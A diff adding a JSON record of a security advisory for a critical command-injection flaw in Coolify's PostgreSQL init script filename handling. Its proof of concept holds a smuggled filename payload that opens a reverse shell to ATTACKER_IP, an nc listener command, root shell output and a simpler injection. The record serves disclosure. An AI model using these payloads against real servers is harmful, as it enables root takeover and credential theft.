@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-24mp-fc9q-c884",
+  "repo": {
+    "cve_id": "CVE-2025-66211",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\nA command injection vulnerability in the PostgreSQL init script management allows authenticated users with database permissions to execute arbitrary commands as root on the server. The filename parameter is passed directly to shell commands without sanitization when deleting or renaming init scripts. Due to Coolify's automatic sudo injection mechanism, all command injections result in root-level access regardless of SSH user configuration.\r\n\r\n### Details\r\n\r\nUser-controlled filename input flows from the frontend to shell commands without `escapeshellarg()` sanitization.\r\n\r\n**Vulnerable Code in `app/Livewire/Project/Database/Postgresql/General.php`:**\r\n\r\n**Line 331-334 (save_init_script - when renaming):**\r\n```php\r\n$old_file_path = \"$configuration_dir/docker-entrypoint-initdb.d/{$oldScript['filename']}\";\r\n$delete_command = \"rm -f $old_file_path\";\r\ninstant_remote_process([$delete_command], $this->server);\r\n```\r\n\r\n**Line 373-376 (delete_init_script):**\r\n```php\r\n$file_path = \"$configuration_dir/docker-entrypoint-initdb.d/{$script['filename']}\";\r\n$command = \"rm -f $file_path\";\r\ninstant_remote_process([$command], $this->server);\r\n```\r\n\r\n**Input validation in save_new_init_script() only checks for string type (line 405):**\r\n```php\r\n$this->validate([\r\n    'new_filename' => 'required|string',  // No shell metacharacter filtering\r\n    'new_content' => 'required|string',\r\n]);\r\n```\r\n\r\n**Automatic Root Escalation via `bootstrap/helpers/sudo.php` (lines 75-81):**\r\n\r\nCoolify automatically injects `sudo` into command substitutions for non-root SSH users:\r\n```php\r\nif (str($line)->contains('$(')) {\r\n    $line = $line->replace('$(', '$(sudo ');  // Injects sudo into payload!\r\n}\r\n```\r\n\r\nThis means the payload `test$(bash -i >& /dev/tcp/...)` becomes `sudo rm -f /path/test$(sudo bash -i >& /dev/tcp/...)`, guaranteeing root access regardless of SSH configuration.\r\n\r\n### PoC\r\n**Prerequisites:**\r\n- Coolify instance (tested on v4.0.0-beta.448)\r\n- Authenticated user with database permissions\r\n- PostgreSQL database resource\r\n\r\n**Steps to reproduce:**\r\n\r\n1. Start a listener on attacker machine:\r\n```bash\r\nnc -lvnp 6666\r\n```\r\n\r\n2. Navigate to PostgreSQL database → Configuration tab\r\n\r\n3. In \"Init Scripts\" section, click \"Add New Init Script\"\r\n\r\n4. Enter the following:\r\n   - **Filename:** `test$(bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1)`\r\n   - **Content:** `-- test`\r\n\r\n5. Click Save to add the script\r\n\r\n6. Click Delete on the script you just created\r\n\r\n7. Receive root shell on your listener:\r\n\r\nconnect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 49444\r\nroot@target:/home/user# id\r\nuid=0(root) gid=0(root) groups=0(root)\r\n\r\nSimple RCE verification:\r\ntest$(id > /tmp/pwned.txt)\r\n\r\n\r\n\r\n### Impact\r\n**Severity: Critical (CVSS 9.9)**\r\n\r\n- **Root Remote Code Execution:** Commands execute as root due to Coolify's sudo injection mechanism\r\n- **Container Escape:** Commands execute on the host system, not inside containers\r\n- **Full Infrastructure Compromise:** Access to Docker socket (`/var/run/docker.sock`) enables control of all containers\r\n- **Credential Theft:** Access to `/etc/shadow`, SSH keys, and all stored secrets\r\n- **Lateral Movement:** Pivot to all servers managed by the Coolify instance\r\n- **Affects all database types:** Similar patterns likely exist in MySQL/MariaDB init script handlers\r\n\r\n**Privilege Escalation Note:**\r\n\r\nEven when Coolify is configured with a non-root SSH user (recommended security practice), the `parseCommandsByLineForSudo()` function in `bootstrap/helpers/sudo.php` automatically injects `sudo` into:\r\n- Command substitutions: `$(` becomes `$(sudo `\r\n- Backticks: `` ` `` becomes `` `sudo ``\r\n- Logical operators: `||` becomes `|| sudo`, `&&` becomes `&& sudo`\r\n\r\nThis design flaw ensures ALL command injection vulnerabilities result in root access, making the \"use non-root user\" security recommendation completely ineffective.\r\n\r\n\r\n",
+    "ghsa_id": "GHSA-24mp-fc9q-c884",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-24mp-fc9q-c884",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-24mp-fc9q-c884"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-66211"
+      }
+    ],
+    "published_at": "2026-01-03T15:13:38Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated Remote Code Execution via Command Injection in PostgreSQL Init Script Filename",
+    "updated_at": "2026-01-03T15:13:38Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": ">= 4.0.0-beta.451",
+        "vulnerable_version_range": "<= 4.0.0-beta.448"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
